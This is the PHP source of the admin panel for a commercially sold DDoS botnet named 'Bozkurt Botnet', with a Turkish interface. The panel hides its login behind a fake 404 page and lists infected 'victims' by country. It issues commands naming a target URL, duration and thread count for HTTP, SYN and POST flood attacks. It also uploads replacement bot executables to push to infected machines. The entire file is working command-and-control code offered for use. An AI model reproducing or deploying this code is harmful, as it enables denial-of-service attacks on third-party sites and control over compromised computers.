<?
        error_reporting(0);
	if ($_GET['a']=='exit') {
		setcookie("dj","exit", time()+8640000);
		echo "</script><meta http-equiv='REFRESH' CONTENT='0;URL=index.php'>";
	}
function user_geo_ip($ip, $id) {
		include_once("geo_ip.php");
		$geoip = geo_ip::getInstance("geo_ip.dat");
		if ($id == 1) {
			$cont = $geoip->lookupCountryCode($ip);
		} elseif ($id == 2) {
			$cont = $geoip->lookupCountryName($ip);
		} elseif ($id == 3) {
			$name = $geoip->lookupCountryName($ip);
			$img = str_replace(" ", "_", strtolower($name));
			if (file_exists("img/".$img.".png")) {
				$cont = "<img src=\"img/".$img.".png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\">";
			} else {
				$cont = "<img src=\"img/question.png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\">";
			}
		} elseif ($id == 4) {
			$name = $geoip->lookupCountryName($ip);
			$img = str_replace(" ", "_", strtolower($name));
			if (file_exists("img/".$img.".png")) {
				$cont = "<img src=\"img/".$img.".png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\"> $ip";
			} else {
				$cont = "<img src=\"img/question.png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\"> $ip";
			}
		}
		return $cont;
}
	include"core.php";
	include"config.php";
	if ($_GET['login']!=$GET_login) {
		if ($_GET['login']=='') {
			$folder=$folder."admin.php";
		} else {
			$folder=$folder."admin.php?login=".$_GET['login'];
		}
		include"404.php";
	}
	include"aut.php";
	if (($l<>1)and($_GET['new'])!=1) {
		echo '<meta http-equiv="REFRESH" CONTENT="0;URL=admin.php?login='.$GET_login.'&new=1">';
		exit;
	}
	echo'<html>
<head>
<title>Bozkurt Botnet</title>
<meta http-equiv="Content-Type" content="text/html; charset=WINDOWS-1251" />
<link rel="stylesheet" media="screen" type="text/css" title="style" href="css/main.css" />
<link href="css/jquery.bubblepopup.v2.3.1.css" rel="stylesheet" type="text/css" />
<body>';
	if ($l<>1) {
		echo'
<br/>
<center>
<table cellspacing="0">
<tr>
<td><img src="img/logo.png"></td>
<td>
<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width="145" height="180" id="woolf" align="left">
<param name="allowScriptAccess" value="sameDomain" />
<param name="movie" value="img/woolf.swf" /><param name="quality" value="high" /><param name="wmode" value="transparent" /><param name="bgcolor" value="#ffffff" /><embed src="img/woolf.swf" quality="high"  wmode="transparent" bgcolor="#ffffff" width="150" height="180" name="woolf" align="left" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
</object>
</td>
</tr>
</center>
</table>

   		
	   		<br/><br/>
		   		<div id="menu">
		   			<div id="navigation">
		   			
		     		<div class="shooter"><img src="img/V.png"></img></div>
                                <ul class="menuUL">
                                </ul>
		     		<div class="clear"></div>
	     	  </div>
	     	</div><br/>
<div class="maindiv">
	<br/>
	<br/>
<form action="login.php" method="POST" align="center">
<br>
<table class="aut" align="center">
 <tr>
  <td>Login:<td><input style="width:250px" type="text" name="login">
 <tr>
  <td>Password:<td><input style="width:250px" type="password" name="pass">
 <tr>
   <td colspan="2" align="center"><input type="submit" value="OK" style="width:95%">
</table>
</form>
</div>
		';
	} else {
		echo'
<br/>
<center>
<table cellspacing="0">
<tr>
<td><img src="img/logo.png"></td>
<td>
<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width="145" height="180" id="woolf" align="left">
<param name="allowScriptAccess" value="sameDomain" />
<param name="movie" value="img/woolf.swf" /><param name="qua	lity" value="high" /><param name="wmode" value="transparent" /><param name="bgcolor" value="#ffffff" /><embed src="img/woolf.swf" quality="high"  wmode="transparent" bgcolor="#ffffff" width="150" height="180" name="woolf" align="left" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
</object>
</td>
</tr>
</center>
</table>

   		
	   		<br/><br/>
		   		<div id="menu">
		   			<div id="navigation">
		   			
		     		<div class="shooter"><img src="img/V.png"></img></div>
                                <ul class="menuUL">
                                <li><div class="tTip"><a href=admin.php?login='.$GET_login.'><span class="homeico">Kontrol Paneli</span></a></div></li>
		        	<li><div class="tTip"><a href=admin.php?login='.$GET_login.'&a=online><span class="dlico">Online Kurbanlar</span></a></div></li>
		        	<li><div class="tTip"><a href=admin.php?login='.$GET_login.'&a=s_today><span class="dlico">Tum Kurbanlar</span></a></div></li>
		        	<li><div class="tTip"><a href=admin.php?login='.$GET_login.'&a=update><span class="dlico">Guncelleme</span></a></div></li>
		        	<li><div class="tTip"><a href=admin.php?login='.$GET_login.'&a=faq><span class="homeico">Hakkinda</span></a></div></li>
		         	<li><div class="tTip"><a href=admin.php?login='.$GET_login.'&a=exit><span class="exit">Cikis</span></a></div></li>		         	
                                </ul>
		     		<div class="clear"></div>
	     	  </div>
	     	</div><br/>';
if ($_GET['a']=='') {
echo'
<div class="maindiv">
	<br/>
<center>
<table class="panel" style="width: 100%"><tr><td style="width: 100%">
</td></tr><tr><td style="width: 100%">';
	$time = time();
	mysql_query("delete from `n` where `n`<$time-$interval-1 ");
	$sql = mysql_query("select `n` from `n` ");
	$num_rows = mysql_num_rows($sql);
	$n = $num_rows;
	mysql_query("delete from `td` where `time`<$time-86399 ");
	$sql = mysql_query("select `time` from `td` ");
	$num_rows = mysql_num_rows($sql);
	$td=$num_rows;
	$file_handle = fopen("comand/cron.php", "r");
	while (!feof($file_handle)) {
		$line = $line.fgets($file_handle);
	}
	fclose($file_handle);
	if (strpos($line,']')!=0) {
		$url_load=substr($line,1,strpos($line,']')-1);
		$line=str_replace('['.$url_load.']','',$line);
		$id=substr($line,1,strpos($line,']')-1);
		$line=str_replace('['.$id.']','',$line);
	}
	$stop=substr($line,0,1);
$modes=substr($line,1,1);
if ($modes==1) {
$sel1='selected="selected" ';
}
if ($modes==2) {
$sel2='selected="selected" ';
}
if ($modes==3) {
$sel3='selected="selected" ';
}
if ($modes==4) {
$sel4='selected="selected" ';
}
if ($modes==5) {
$sel5='selected="selected" ';
}
	$flows=substr($line,3,3)+0;
	$i=str_replace($stop.$modes.'|'.$flows.'|','',$line)+0;
	$str = strpos($line,'{');
	if ($str > 0) {
		$str2 = strpos($line,'}');
		$load=substr($line,$str+1,$str2-$str-1);
	}
	if ($load <> '') {
		$l = '{'.$load.'}';
	} else {
		$l = '';
	}
	$url=str_replace($stop.$modes.'|'.$flows.'|'.$i.$l,'',$line);
	if ($_GET['info'] <> '') {
		$id = $_POST['id'];
		$url_load = $_POST['url_load'];
		$a1 = $_GET['info'];
		$a2 = $_POST['flows']; $a2 = $a2 + 0;
		$a4 = $_POST['url'];
		$a5 = $_POST['interval'];
                $modes = $_POST['mode'];
		if ($_POST['ok'] <> '') { $stop = $_GET['info']; }
		if ($stop == '') { $stop = 1; }
		$code = $stop.$modes.'|'.$a2.'|'.$a5.$a6.$a4;
		if (($id != '')and($url_load != '')) {
			$code = '['.$url_load.']['.$id.']'.$code;
		} 
  		$file = fopen ("comand/cron.php","w+");
  		if ( !$file ) {
    			echo("Error open file");
			exit;
		} else {
			fputs ( $file, $code);
  		}
 		fclose ($file);
		echo '<META HTTP-EQUIV="REFRESH" CONTENT="0; URL=admin.php?login='.$GET_login.'">';
		exit;
	}
	if ($stop==1) {
		echo '<form action="admin.php?login='.$GET_login.'&info=0" method=post>';
		$s3 = 'Start';
	} else {
		echo '<form action="admin.php?login='.$GET_login.'&info=1" method=post>';
		$s3 = 'Stop';
	}
		$onl = 'Online: <b><a href="admin.php?login='.$GET_login.'&a=online"><font color=#FFFB16>'.$n.'</font></a></b><br>Bugun: <b><a href="admin.php?login='.$GET_login.'&a=s_today"><font color=#FFFB16>'.$td.'</font></a></b>';
	echo '<center>'.$onl.'<table border="0" style="width: 80%"><tr><td style="width: 100%">URL:</td><tr/><tr><td width=350><textarea rows="7" style="width: 100%" name="url">'.$url.'</textarea></td></tr><tr><td  style="width: 100%">
          <p><FONT SIZE=3>Saldirilacak Sure: </FONT><input name="interval" value="'.$interval.'" type=text maxlength="2" size="2"><FONT SIZE=2> (60 dakika)</FONT></p>
          <p><FONT SIZE=3>Takip: &nbsp;&nbsp;&nbsp;</FONT><input name="flows" value="'.$flows.'" type=text maxlength="3" size="4"></p>
          <p><FONT SIZE=3>Saldiri Tipi: &nbsp;</FONT><select name="mode">        
          <option '.$sel1.'value="1">HTTP flood</option>
          <option '.$sel2.'value="2">SyN flood</option>
          <option '.$sel3.'value="3">DoWN flood</option>
          <option '.$sel4.'value="4">POST flood</option>
          <option '.$sel5.'value="5">ANTIDDoS</option>  
      </select></p>
</td></tr>
<tr><td align=center width=350><input name="ok" value="'.$s3.'" type=submit  size="50" style="width: 50%" ><input name="save" value="Save" type=submit style="width: 50%" ></td></tr>
</table></center><br>';
		echo'</td></tr></table>';
		echo'</center></div>';
}
if ($_GET['a']=='s_today') {
echo'<div class="maindiv">
<center>
<table class="panel" style="width: 60%"><tr><td style="width: 100%">
<center>';
	$time2 = time();
	mysql_query("delete from `td` where `time`<$time2-86399 ");
	$query = "SELECT * FROM `td`";
	$res = mysql_query($query) or die(mysql_error());
	$number = mysql_num_rows($res);
	echo 'All: '.$number;
	echo '<br>';
  	while ($row=mysql_fetch_array($res)) {
		$ip = $row['ip2'];
		$geo=user_geo_ip($ip,1);
		$stat[$geo]=$stat[$geo]+1;
		$stat2[$geo]=$ip;
  	}
	arsort($stat);
	reset($stat);
	foreach($stat as $i => $geo){ 
		echo '<small>'.user_geo_ip($stat2[$i],3).' '.$stat[$i].'</small>';
		echo '<br>';
	}
echo'</center>
</td></tr></table>
</center>
';
}
if ($_GET['a']=='online') {
echo'<div class="maindiv">
<center>
<table class="panel" style="width: 60%"><tr><td style="width: 100%">
<center>';
	$time = time()-$interval-1;
	mysql_query("delete from `n` where `n`<$time-$interval-1 ");
	$sql = mysql_query("select `n` from `n` ");
	mysql_query("delete from `n` where `n`<$time");
	$query = "select `ip` from `n` ";
	$res = mysql_query($query) or die(mysql_error());
	$number = mysql_num_rows($res);
	echo 'Online: '.$number;
	echo '<br>';
  	while ($row=mysql_fetch_array($res)) {
		$ip = $row['ip'];
		$geo=user_geo_ip($ip,1);
		$stat[$geo]=$stat[$geo]+1;
		$stat2[$geo]=$ip;
  	}
	arsort($stat);
	reset($stat);
	foreach($stat as $i => $geo){ 
		echo '<small>'.user_geo_ip($stat2[$i],3).' '.$stat[$i].'</small>';
		echo '<br>';
	}
echo'</center>
</td></tr></table>
</center>
</div></br></br>';
}

if ($_GET['a']=='update') {
echo'<div class="maindiv">';

$num = 500;

$dead = 7;

$delay = 71;

$STATU = stat('data/update.exe');

echo '
<b>Botlari Guncelleme</b></br></br>
'.(($STATU['size'])?('
<b>Size: </b>'.$STATU['size'].' <b>байт</b></br>
<b>Version of the: </b>'.date('d.m.y H:i:s', $STATU['mtime']).'</br>
<b>Last download: </b>'.date('d.m.y H:i:s', $STATU['atime']).'</br></br>
'):('')).'
Guncellenmis botu yukleyin:</br>Herhangi bir guncelleme yoksa, Baska birsey yuklemeyin:</br>
<form action="admin.php?login='.$GET_login.'&a=update" method="post" enctype="multipart/form-data">
<input type="file" name="filename"><input type="submit" value="OK"><br>
</form>';
 if($_FILES["filename"]["size"] > 1024*3*1024)
   {
     echo ("Размер файла превышает три мегабайта</br>File size exceeds three megabytes");
     exit;
   }
   // Проверяем загружен ли файл
   if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
   {
     // Если файл загружен успешно, перемещаем его
     // из временной директории в конечную
     move_uploaded_file($_FILES["filename"]["tmp_name"], "data/update.exe");
   } else {
      echo("Bu kisim ile oynamaniz tavsiye edilmez!</br>Bilmediginiz birsey tum aginizi cokertebilir!");
   }
echo'</div>';
}

if ($_GET['a']=='faq') {
echo'<div class="maindiv">';
echo '<b>BOZKURT BOTNET</b></br></br>
ByErdogan Tarafindan gelistirilmis olup, Micro Satis Araciligi ile sunulmaktadir.</br></br>
<b>Lisans Hakki</b></br></br>
(Nitvin Media Grup) Micro Satis aittir..';
echo'</div>';
}

	}
echo'
</body>
</head>
</html>
';
?>